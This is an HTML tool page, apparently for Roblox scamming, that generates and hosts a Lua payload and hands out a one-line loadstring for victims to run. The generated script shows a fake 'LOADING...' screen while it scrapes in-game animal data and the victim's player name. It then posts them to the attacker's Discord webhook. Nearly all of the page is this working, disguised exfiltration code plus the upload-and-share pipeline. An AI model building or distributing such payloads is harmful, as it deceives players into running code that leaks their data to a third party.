<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Beanz Pastebin Gen</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #111; border: 2px solid #0f0; padding: 25px; border-radius: 10px; width: 90%; max-width: 450px; text-align: center; box-shadow: 0 0 20px #0f0; }
        input { width: 100%; padding: 12px; margin: 15px 0; background: #000; border: 1px solid #0f0; color: #0f0; box-sizing: border-box; border-radius: 5px; outline: none; }
        button { width: 100%; padding: 12px; background: #0f0; border: none; color: #000; font-weight: bold; cursor: pointer; border-radius: 5px; }
        button:disabled { background: #050; color: #555; }
        #status { margin-top: 15px; font-size: 13px; color: #fff; }
        #result { margin-top: 15px; padding: 12px; border: 1px dashed #0f0; background: #050505; color: #0f0; font-size: 11px; display: none; word-break: break-all; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <h2>BEANZ PASTEBIN GEN</h2>
        <input type="text" id="webhook" placeholder="Paste Discord Webhook URL">
        <button id="genBtn" onclick="generate()">GENERATE & UPLOAD</button>
        <div id="status">Status: Ready</div>
        <div id="result" onclick="copyResult()"></div>
    </div>

    <script>
        async function generate() {
            const web = document.getElementById('webhook').value.trim();
            const status = document.getElementById('status');
            const result = document.getElementById('result');
            const btn = document.getElementById('genBtn');

            if(!web.includes("discord.com/api/webhooks")) return alert("Invalid Webhook!");

            btn.disabled = true;
            status.innerText = "Status: Uploading to Pastebin...";

            const lua = `local WEBHOOK_URL = "${web}"
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")

local function send()
    local d = {}
    local deb = Workspace:FindFirstChild("Debris")
    if deb then
        for _, t in ipairs(deb:GetChildren()) do
            if t.Name == "FastOverheadTemplate" then
                local ov = t:FindFirstChild("AnimalOverhead")
                if ov then
                    local n = ov:FindFirstChild("DisplayName")
                    local g = ov:FindFirstChild("Generation")
                    if n and g then table.insert(d, n.Text .. " (Gen: " .. g.Text .. ")") end
                end
            end
        end
    end
    local s = table.concat(d, "\\n")
    local p = {["content"] = "@everyone", ["embeds"] = {{["title"] = "🫘 Scrape Result", ["color"] = 65280, ["fields"] = {{["name"] = "Player", ["value"] = Players.LocalPlayer.Name}, {["name"] = "Data", ["value"] = "\\\`\\\`\\\`" .. (s ~= "" and s or "None Found") .. "\\\`\\\`\\\`"}}}} }
    local r = syn and syn.request or http and http.request or http_request or request
    if r then r({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(p)}) end
end

local sg = Instance.new("ScreenGui", game:GetService("CoreGui"))
local f = Instance.new("Frame", sg)
f.Size = UDim2.new(1, 0, 1, 0)
f.BackgroundColor3 = Color3.new(0,0,0)
local l = Instance.new("TextLabel", f)
l.Size = UDim2.new(1,0,1,0)
l.Text = "LOADING..."
l.TextColor3 = Color3.new(1,1,1)
l.TextSize = 30

task.wait(2)
send()`;

            try {
                // Using a special public Pastebin uploader tool to bypass CORS
                const response = await fetch('https://api.cl1p.net/beanz' + Math.floor(Math.random() * 99999), {
                    method: 'POST',
                    body: lua
                });

                if (response.ok) {
                    const url = response.url;
                    status.innerText = "Status: Success! Copy below:";
                    result.innerText = 'loadstring(game:HttpGet("' + url + '"))()';
                    result.style.display = "block";
                } else {
                    status.innerText = "Status: Upload failed. Try again.";
                }
            } catch (e) {
                status.innerText = "Status: Connection Error.";
            }
            btn.disabled = false;
        }

        function copyResult() {
            navigator.clipboard.writeText(document.getElementById('result').innerText);
            alert("Copied loadstring!");
        }
    </script>
</body>
</html>
